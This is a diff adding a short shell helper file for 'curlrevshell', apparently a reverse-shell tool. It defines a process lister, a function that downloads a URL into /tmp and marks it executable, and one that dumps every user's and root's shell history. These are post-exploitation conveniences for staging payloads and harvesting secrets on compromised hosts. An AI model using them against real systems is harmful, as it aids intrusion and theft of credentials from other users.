@@ -1,0 +1,36 @@
+# functions.subr
+# Handy shell functions when using curlrevshell
+# By The Author
+# Created 20240602
+# Last Modified 20240602
+
+# The functions in this file are largely intended to be used in a Linux
+# environment but most should also work on macOS and OpenBSD.  Maybe.
+
+# psod (ps Oh dear) lists processes in a nice tree
+# Usage: psod
+function psod { ps awwwfux || ps auxwww; }
+
+# tget downloads a file into /tmp
+# Usage: tget url filename
+function tget {
+        if [ -z "$1" ] || [ -z "$2" ]; then
+                echo "Usage: $0 url filename" >&2
+                return 1
+        fi
+        curl --silent --verbose --location --max-time 60 "$1" > "/tmp/$2" &&
+                chmod 0755 "/tmp/$2";
+}
+
+# shell_histories dumps shell histories from users and /root
+function histories {
+        for f in /Users/*/.*history /home/*/.*history /root/.*history; do
+                if [ -f "$f" ]; then
+                        echo "---- $f ----"
+                        cat "$f"
+                fi
+        done
+        echo "---- Done ----"
+}
+
+# vim: ft=sh
